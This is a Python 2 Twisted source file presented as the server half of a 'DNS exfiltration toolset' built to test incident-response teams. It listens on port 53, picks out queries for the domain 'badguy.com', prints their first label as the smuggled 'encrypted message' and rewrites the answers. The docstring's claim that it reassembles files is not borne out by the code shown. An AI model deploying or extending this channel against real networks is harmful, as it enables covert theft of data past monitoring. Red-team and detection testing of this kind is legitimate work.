#! /usr/bin/env python
"""
DNS Server based on Twisted Framework. Part of DFTP DNS Exfiltration Toolset.
This part is the server part that decodes and reassembles text and files sent by
DNS client program. This DNS server is a fully functional DNS server.

The server is the destination and storage of the exfiltrated data. 
Packets are UDP and look like DNS packets except for payload. 
This program is built to test DFIR response teams and DFIR tools.
__author__:

"""
"""
zone = [
    SOA(
        # For whom we are the authority
        'example-domain.com',

        # This nameserver's name
        mname = "ns1.example-domain.com",

        # Mailbox of individual who handles this
        rname = "root.example-domain.com",

        # Unique serial identifying this SOA data
        serial = 2003010601,

        # Time interval before zone should be refreshed
        refresh = "1H",

        # Interval before failed refresh should be retried
        retry = "1H",

        # Upper limit on time interval before expiry
        expire = "1H",

        # Minimum TTL
        minimum = "1H"
    ),

    A('example-domain.com', '127.0.0.1'),
    NS('example-domain.com', 'ns1.example-domain.com'),

    CNAME('www.example-domain.com', 'example-domain.com'),
    CNAME('ftp.example-domain.com', 'example-domain.com'),

    MX('example-domain.com', 0, 'mail.example-domain.com'),
    A('mail.example-domain.com', '123.0.16.43')
]
"""

import socket

from twisted.internet.protocol import Factory, Protocol
from twisted.internet import reactor
from twisted.names import dns
from twisted.names import client, server


MYDOMAIN = "badguy.com"
HOST = "127.0.0.1"
OUTSIDEDNS = "8.8.8.8"
PORT = 53
TTL = 60


class DNSServerFactory(server.DNSServerFactory):
    def gotResolverResponse(self, (ans, auth, add), protocol, message, address):
        qname = message.queries[0].name.name
        if MYDOMAIN in qname:
            line = qname.split('.')
            print "encrypted message: ", line[0]
            for answer in ans:
                if answer.type != dns.A:
                    print "answer"
                if MYDOMAIN not in answer.name.name:
                    print "going out"


                answer.payload.address = socket.inet_aton(HOST)
                answer.payload.ttl = TTL

        args = (self, (ans, auth, add), protocol, message, address)
        return server.DNSServerFactory.gotResolverResponse(*args)

verbosity = 0
resolver = client.Resolver(servers=[(OUTSIDEDNS, PORT)])
factory = DNSServerFactory(clients=[resolver], verbose=verbosity)
protocol = dns.DNSDatagramProtocol(factory)
factory.noisy = protocol.noisy = verbosity

reactor.listenUDP(PORT, protocol)
reactor.listenTCP(PORT, factory)
reactor.run()
